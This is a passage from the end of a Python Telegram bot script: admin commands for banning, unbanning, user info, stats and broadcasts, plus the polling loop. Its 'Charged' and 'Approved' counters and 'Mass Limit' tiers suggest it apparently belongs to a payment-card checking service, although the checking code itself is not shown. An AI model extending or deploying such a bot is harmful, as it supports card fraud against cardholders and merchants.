        bot.reply_to(message, "[X] Usage: /rmpremium <userid>")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[X] You don't have permission to use this command!!")
        return
    try:
        parts = message.text.split()
        if len(parts) < 2: raise ValueError
        target_id = parts[1].strip()
        duration = parts[2].lower() if len(parts) > 2 else 'lifetime'
        now = time.time()
        
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise ValueError()
        
        append_line(BANNED_FILE, f"{target_id}|{exp}")
        dur_label = "Lifetime" if duration == 'lifetime' else duration.upper()
        bot.reply_to(message, f"[✓] User {target_id} Banned ({dur_label}) by Admin!")
        try: bot.send_message(int(target_id), f"[!] Notice: You have been BANNED by an admin.\n\nDuration: {dur_label}\nStatus: Restricted access\n\nContact admin.")
        except Exception: pass
    except Exception: 
        bot.reply_to(message, "[X] Usage: /ban <userid> <duration>")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[X] You don't have permission to use this command!!")
        return
    try:
        target_id = message.text.split()[1].strip()
        lines = read_lines(BANNED_FILE)
        new_lines = [l for l in lines if l.split('|')[0] != target_id]
        write_lines(BANNED_FILE, new_lines)
        
        bot.reply_to(message, f"[✓] User {target_id} unbanned by Admin!")
        try: bot.send_message(int(target_id), f"[!] Notice: Your BAN has been REMOVED by an admin.\n\nYou can now use the bot again. Make sure to follow the community rules!")
        except Exception: pass
    except Exception: 
        bot.reply_to(message, "[X] Usage: /unban <userid>")

@bot.message_handler(commands=['info'])
def user_info(message):
    try:
        parts = message.text.split()
        target_id = parts[1] if len(parts) > 1 else message.from_user.id
        target_id = str(target_id)
        
        role = "[FREE]"
        limit = FREE_LIMIT
        expire_str = "NEVER"
        
        if is_banned(int(target_id)):
            role = "[BANNED]"
            limit = 0
            expire_str = "Restricted"
        elif is_admin(int(target_id)):
            role = "[ADMIN]"
            limit = PREMIUM_LIMIT
            expire_str = "Lifetime"
        else:
            lines = read_lines(PREMIUM_FILE)
            for p in lines:
                prts = p.split('|')
                if prts[0] == target_id:
                    role = "[PREMIUM]"
                    limit = PREMIUM_LIMIT
                    if len(prts) > 1:
                        exp = float(prts[1])
                        if exp == 0: expire_str = "Lifetime"
                        else:
                            if time.time() > exp:
                                role = "[FREE]"
                                limit = FREE_LIMIT
                                expire_str = "Expired"
                            else:
                                expire_str = datetime.datetime.fromtimestamp(exp).strftime('%Y-%m-%d %H:%M:%S')
                    else: expire_str = "Lifetime"
                    break

        is_p = " [ADMIN]" if is_admin(message.from_user.id) else " [PREMIUM]" if is_premium(message.from_user.id) else " [FREE]"
        safe_fname = html.escape(message.from_user.first_name)
        
        res = f"""
Account Information
━━━━━━━━━━━━━━━━━━━
User ID -> {target_id}
Rank -> {role}
Expires -> {expire_str}
Mass Limit -> {limit}
━━━━━━━━━━━━━━━━━━━
User -> {safe_fname}{is_p}
Dev -> @sh4h4rish4r4fl3h
"""
        bot.reply_to(message, res)
    except Exception:
        bot.reply_to(message, "[X] Error fetching info!")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[X] You don't have permission to use this command!!")
        return
    s = get_stats()
    
    banned_count = len(read_lines(BANNED_FILE))
    premium_count = len(read_lines(PREMIUM_FILE))
    
    s["premium_users"] = premium_count
    s["banned_users"] = banned_count
    save_stats(s)
    
    res = f"""
Bot Stats:
━━━━━━━━━━━━━━━━━━━
Charged: {s.get('charged', 0)}
Approved: {s.get('approved', 0)}
Premium Users: {premium_count}
Banned Users: {banned_count}
Total Users: {s.get('total_users', 0)}
━━━━━━━━━━━━━━━━━━━
Dev -> @sh4h4rish4r4fl3h
"""
    bot.reply_to(message, res)

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "[X] You don't have permission to use this command!!")
        return
    
    msg_text = message.text.replace('/broadcast ', '', 1).strip()
    if not msg_text or message.text.strip() == '/broadcast':
        bot.reply_to(message, "[X] Usage: /broadcast <message>")
        return
    
    users = read_lines(USERS_FILE)
    sent_msg = bot.reply_to(message, f"[✓] Starting Broadcast to {len(users)} users...")
    
    count = 0
    for user in users:
        try:
            bot.send_message(int(user), msg_text)
            count += 1
            time.sleep(0.05) # Prevent flood wait limits
        except Exception:
            pass
    
    final_text = f"[✓] Broadcast Completed!\n\nSent to: {count}/{len(users)} users."
    try:
        bot.edit_message_text(final_text, message.chat.id, sent_msg.message_id)
    except Exception:
        bot.reply_to(message, final_text)

if __name__ == "__main__":
    print("BOT IS RUNNING...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"Polling Error: {e}")
            time.sleep(5)

```
